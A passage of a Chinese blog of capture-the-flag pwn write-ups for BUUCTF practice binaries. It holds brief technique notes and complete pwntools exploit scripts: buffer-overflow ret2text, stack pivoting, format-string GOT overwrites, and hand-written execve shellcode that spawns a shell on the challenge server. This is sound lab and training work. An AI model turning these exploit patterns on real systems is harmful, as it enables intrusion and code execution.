string\">b'\\\\_\\\\ \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./image-20230914214946575.png\" alt=\"image-20230914214946575\"></p>\n<h2 id=\"bbys_tu_2016\"><a class=\"markdownIt-Anchor\" href=\"#bbys_tu_2016\">#</a> bbys_tu_2016</h2>\n<p>ret2text</p>\n<p>这垃圾 buu 系统不知道为啥我不先输入他什么都不显示。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28253</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./bbys_tu_2016')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b puts')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x00804856D</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x0c</span><span class=\"token operator\">+</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#p.recvuntil('This program is hungry. You should feed it.')</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"xdctf2015_pwn200\"><a class=\"markdownIt-Anchor\" href=\"#xdctf2015_pwn200\">#</a> xdctf2015_pwn200</h2>\n<p>ret2libc3</p>\n<h2 id=\"mrctf2020_easyoverflow\"><a class=\"markdownIt-Anchor\" href=\"#mrctf2020_easyoverflow\">#</a> mrctf2020_easyoverflow</h2>\n<p>考查栈的理解</p>\n<p>n0t_r3@11y_f1@g</p>\n<p>ju3t_@_f@k3_f1@g</p>\n<p>system (“/bin/sh”); 在主函数里，只要通过字符串比较即可执行。利用字符串溢出修改 v5 的值。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29368</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./mrctf2020_easyoverflow')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x030</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> <span class=\"token string\">b'n0t_r3@11y_f1@g'</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"ciscn_2019_s_4\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2019_s_4\">#</a> ciscn_2019_s_4</h2>\n<p>ret2libc2 栈迁移</p>\n<p>字符串溢出最多到返回地址处，因此将栈迁移到字符串 buf 起始位置。</p>\n<p>在迁移前需要得知栈上地址，第一次 read 输入 0x28 字节刚好到达旧 ebp 位置，获取其地址，计算偏移为 - 0x38，得到 buf 的地址。</p>\n<p>第二次构造 payload 时，先空出 4 字节给 ebp，然后接 system 的 plt 地址、返回地址以及字符串的地址，之后再接’/bin/sh\\0’字符串。因此字符串地址应该为 buf 地址加 16。之后填充至旧 ebp 处，用 buf 地址替换旧 ebp，而返回地址填入 leave;ret 地址。</p>\n<p>不知道 buu 在发什么颠，getshell 后就退出控制了，所以选择用 cat flag 命令。</p>\n<pre><code>#!/usr/bin/python3\nfrom pwn import *\ncontext(log_level='debug')\n#e=ELF('./')\n#p=process('./ciscn_s_4')\np=remote('node4.buuoj.cn',25150)\n#gdb.attach(p, 'b read')\n\noffset = 0x028\npayload = b'a'*(offset-1) + b'b' \n\np.sendafter('your name?',payload)\np.recvuntil(b'ab')\nebp = u32(p.recv(4))\nprint('the ebp is 0x%x'%ebp)\n\nbuf = ebp - 0x38\nsys = 0x8048400\nsys_c = 0x08048559\nleave_ret = 0x080485FD\npayload =  p32(ebp)+ p32(sys) + p32(sys_c) + p32(buf+0x10) + b'cat flag\\0'\nassert len(payload) &lt;= offset\npayload = payload.ljust(offset,b'a') + p32(buf) +p32(leave_ret)\np.send(payload)\np.interactive()\n</code></pre>\n<h2 id=\"wustctf2020_closed\"><a class=\"markdownIt-Anchor\" href=\"#wustctf2020_closed\">#</a> *wustctf2020_closed</h2>\n<p>这题题目给了 shell 函数，直接执行 system (‘/bin/sh’) 但是执行了 close (2) 和 close (1)，关闭了标准输出和错误输出。</p>\n<p>解决方法是用 bash 命令重定向输出到标准输入。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">exec</span> <span class=\"token operator\"><span class=\"token file-descriptor important\">1</span>></span><span class=\"token file-descriptor important\">&amp;0</span></pre></td></tr></table></figure><p><img data-src=\"./image-20230915002630116.png\" alt=\"image-20230915002630116\"></p>\n<h2 id=\"\"><a class=\"markdownIt-Anchor\" href=\"#\">#</a> </h2>\n<p>泄露 cca8 处的栈地址，为第 2 个格式参数。得到 ccbf，目标地址 cefc，偏移为 cefc-ccbf=23d。</p>\n<p>字符串头取 cdcc 处，为第 (cdcc-cca0)/4=4b 个格式参数。</p>\n<p>修改 format 末端</p>\n<p><img data-src=\"./image-20230915100049886.png\" alt=\"image-20230915100049886\"></p>\n<h2 id=\"-2\"><a class=\"markdownIt-Anchor\" href=\"#-2\">#</a> </h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./axb_2019_fmt32'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./axb_2019_fmt32'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27454</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b *0x0804867D')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>memset_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'memset'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Please tell me:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'%2$p'</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Repeater:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>ret <span class=\"token operator\">+=</span> <span class=\"token number\">0x23d</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the address of ret %#x'</span><span class=\"token operator\">%</span>ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Please tell me:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'aaa'</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>lsm_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'%75$s'</span> </pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#payload = b'aaaa'+b'%75$p'</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the true address of __libc_start_main is %#x'</span><span class=\"token operator\">%</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span> lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">change</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    payload <span class=\"token operator\">=</span> <span class=\"token string\">b'baa'</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'%'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>content<span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token operator\">-</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'd%75$hn'</span> </pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token comment\">#assert len(payload) &lt;=6</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the address of sys %#x'</span><span class=\"token operator\">%</span>sys_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Please tell me:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'baa'</span><span class=\"token operator\">+</span>fmtstr_payload<span class=\"token punctuation\">(</span><span class=\"token number\">75</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span>memset_g<span class=\"token punctuation\">:</span>sys_a<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span><span class=\"token string\">'byte'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\">#payload = b'aaa'+fmtstr_payload(75,&#123;ret:sys_a&#125;, 12,'byte')</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Repeater:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b';/bin/sh\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"pwnable_start\"><a class=\"markdownIt-Anchor\" href=\"#pwnable_start\">#</a> pwnable_start</h2>\n<p>ret2shellcode ret2syscall 汇编</p>\n<p>没有栈不可执行保护，所以选择 ret2shellcode，其次该程序很简洁，函数调用均使用系统调用。</p>\n<p>先泄露栈上地址。第一次返回后 esp 刚好指向一个栈地址。其次 write 系统调用的 buf 地址直接取当时的 esp。因此将返回地址修改到 write 前面，即可实现泄露地址。泄露的地址与 ret 后可输入的 buf 地址（即 ret 后 esp 地址）偏差为 cfdc-cfe0=4。（返回到 mov ecx, esp 处。因为 write 和 read 系统调用均已 ecx 为输入输出处，所以可控制栈内存起始处就是 esp 处。</p>\n<p><img data-src=\"./image-20230917173934650.png\" alt=\"image-20230917173934650\"></p>\n<p>由于只能输入 3c 个字符，0x14 处为返回地址，而之后仅剩 3c-14=0x28 个字节可输入，而 shellcode 有 2c 个字节，不够写。所以自己写一个 shellcode。</p>\n<p>在第一次输入时顺便写入 /bin/sh 字符，第二次构造 shellocde 时直接把第一次输入的地址传入 ebx 寄存器。地址与第二次 ret 后 esp 的偏差为 (0x14+0x4)*2=0x30。之后把 eax, ecx, edx 的值分别设置即可。</p>\n<pre><code class=\"language-assembly\">sub esp, 0x030; \nmov ebx, esp; \nxor ecx, ecx; \nxor edx, edx; \npush 0xb; \npop eax; \nint 0x80;\n</code></pre>\n<p>长度为 0xE</p>\n<p>完整代码：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=process('./start')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25028</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b 0x08048087')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x014</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>tar1 <span class=\"token operator\">=</span> <span class=\"token number\">0x08048087</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>tar1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'CTF:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>addr1 <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>addr2 <span class=\"token operator\">=</span> addr1<span class=\"token operator\">-</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>assem<span class=\"token operator\">=</span><span class=\"token string\">'sub esp, 0x030; mov ebx, esp; xor ecx, ecx; xor edx, edx; push 0xb; pop eax; int 0x80;'</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>payload <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>assem<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>addr2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"-3\"><a class=\"markdownIt-Anchor\" href=\"#-3\">#</a> </h2>\n<h2 id=\"axb_2019_fmt64\"><a class=\"markdownIt-Anchor\" href=\"#axb_2019_fmt64\">#</a> axb_2019_fmt64</h2>\n<p>64 位为寄存器传参，第 7 位参数开始才放在栈上。</p>\n<p><img data-src=\"./image-20230919172840631.png\" alt=\"image-20230919172840631\"></p>\n<p>可控制的字符串位置为 db50（前一个有个冒号）栈上参数起始位置为 db40</p>\n<p>所以参数偏移为 6+(0xdb50 - 0xdb40)/0x8 = 0x8=8</p>\n<p>已填充字符个数为 9</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./axb_2019_fmt64'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#=process('./axb_2019_fmt64')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29294</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#db.attach(p, 'b printf')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>printf_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'printf'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Please tell me:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'%9$s'</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Repeater:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the true address of __libc_start_main is %#x'</span><span class=\"token operator\">%</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span> lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the address of sys %#x'</span><span class=\"token operator\">%</span>sys_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Please tell me:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>payload <span class=\"token operator\">=</span> fmtstr_payload<span class=\"token 